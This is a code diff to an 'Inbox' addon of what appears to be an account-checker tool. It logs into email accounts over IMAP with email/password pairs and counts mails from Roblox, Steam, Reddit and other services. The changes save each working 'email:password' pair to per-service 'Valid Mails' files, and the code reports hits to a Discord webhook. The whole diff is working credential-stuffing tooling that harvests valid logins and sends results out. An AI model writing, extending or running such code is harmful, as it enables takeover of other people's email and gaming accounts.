@@ -1,4 +1,4 @@
-import imaplib, requests, json
+import imaplib, requests, json, os
 from email.utils import parsedate_to_datetime
 
 with open('addons/Inbox/config.json', 'r') as config_file:
@@ -45,9 +45,10 @@ def inboxmail(email, password):
                 reddit_year = None
 
                 if check_roblox == True:
-                    result, data = imap.uid("search", None, f'(FROM "noreply@roblox.com")')
+                    result, accounts_data = imap.uid("search", None, f'(FROM "accounts@roblox.com")')
+                    result, noreply_data = imap.uid("search", None, f'(FROM "no-reply@roblox.com")')
                     if result == "OK":
-                        counts['Roblox'] = len(data[0].split())
+                        counts['Roblox'] = len(accounts_data[0].split()) + len(noreply_data[0].split())
                 if check_steam == True:
                     result, data = imap.uid("search", None, f'(FROM "noreply@steampowered.com")')
                     if result == "OK":
@@ -64,9 +65,9 @@ def inboxmail(email, password):
                                 email_date = parsedate_to_datetime(date_str)
                                 discord_year = email_date.year
                 if check_reddit == True:
-                    main_result, main_data = imap.uid("search", None, f'(FROM "noreply@reddit.com")')
-                    mail_result, mail_data = imap.uid("search", None, f'(FROM "noreply@redditmail.com")')
-                    if main_result == "OK" and mail_result == "OK":
+                    result, main_data = imap.uid("search", None, f'(FROM "noreply@reddit.com")')
+                    result, mail_data = imap.uid("search", None, f'(FROM "noreply@redditmail.com")')
+                    if result == "OK":
                         main_uids = main_data[0].split()
                         mail_uids = mail_data[0].split()
                         counts['Reddit'] = len(main_uids + mail_uids)
@@ -103,6 +104,14 @@ def inboxmail(email, password):
                     result, data = imap.uid("search", None, f'(FROM "{check_info["email"]}")')
                     if result == "OK":
                         counts[check_name] = len(data[0].split())
+                
+                if not os.path.exists('Valid Mails'):
+                    os.makedirs('Valid Mails')
+                
+                for service, count in counts.items():
+                    if count > 0:
+                        with open(f'Valid Mails/{service}.txt', 'a') as file:
+                            file.write(f'{email}:{password} | {count} hits\n')
 
         except Exception as e:
             continue
@@ -118,4 +127,6 @@ def inboxmail(email, password):
                             message += f"{service}: {count} ✅\n"
                     
                     payload = {"content": message}
-        requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
+        r = requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
+        if r.status_code == 404:
+            input("Hold up! You forgot to provide a webhook for Inbox. Hits are not being logged! Edit addons/Inbox/config.json")
